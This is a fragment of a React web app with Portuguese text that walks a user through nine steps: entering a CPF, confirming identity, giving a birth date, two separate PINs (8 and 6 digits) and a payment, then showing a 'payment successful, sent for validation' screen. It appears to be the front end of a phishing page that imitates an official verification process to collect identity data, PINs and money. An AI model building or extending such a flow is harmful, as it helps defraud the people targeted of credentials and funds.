...
function Step4({ onRestart }) { return <section className="step-panel complete-panel"><div className="success-icon">✓</div><h1>Pagamento realizado com sucesso.</h1><p className="subtitle">Recebemos a confirmação do seu pagamento e suas informações foram encaminhadas para validação.</p><div className="status-card"><span className="status-dot" /> Processo em análise</div><button className="primary-button" type="button" onClick={onRestart}>Voltar ao início</button><p className="privacy">Não feche esta página até concluir o processo.</p></section>; }
...
export default function App() {
  ...
  return <main className="page"><div className="page__inner"><Header step={step} /><div className="content" key={step}>{step === 1 && <Step1 cpf={cpf} setCpf={setCpf} onContinue={(data) => { setIdentity(data); setStep(2); }} />}{step === 2 && <Step2 cpf={cpf} identity={identity} onContinue={() => setStep(3)} onBack={() => setStep(1)} />}{step === 3 && <StepBirthDate identity={identity} onContinue={() => setStep(4)} onBack={() => setStep(2)} />}{step === 4 && <StepPin onContinue={(value) => { setPin8(value); setStep(5); }} onBack={() => setStep(3)} />}{step === 5 && <StepPin6 previousPin={pin8} onContinue={() => setStep(6)} onBack={() => setStep(4)} />}{step === 6 && <StepPayment cpf={cpf} identity={identity} onContinue={() => setStep(7)} onBack={() => setStep(5)} />}{step === 7 && <StepReview cpf={cpf} identity={identity} onContinue={() => setStep(8)} onBack={() => setStep(6)} />}{step === 8 && <Step3 onContinue={() => setStep(9)} onBack={() => setStep(7)} />}{step === 9 && <Step4 onRestart={() => { setStep(1); setCpf(""); setIdentity(null); setPin8(""); }} />}</div><Footer /></div></main>;
}
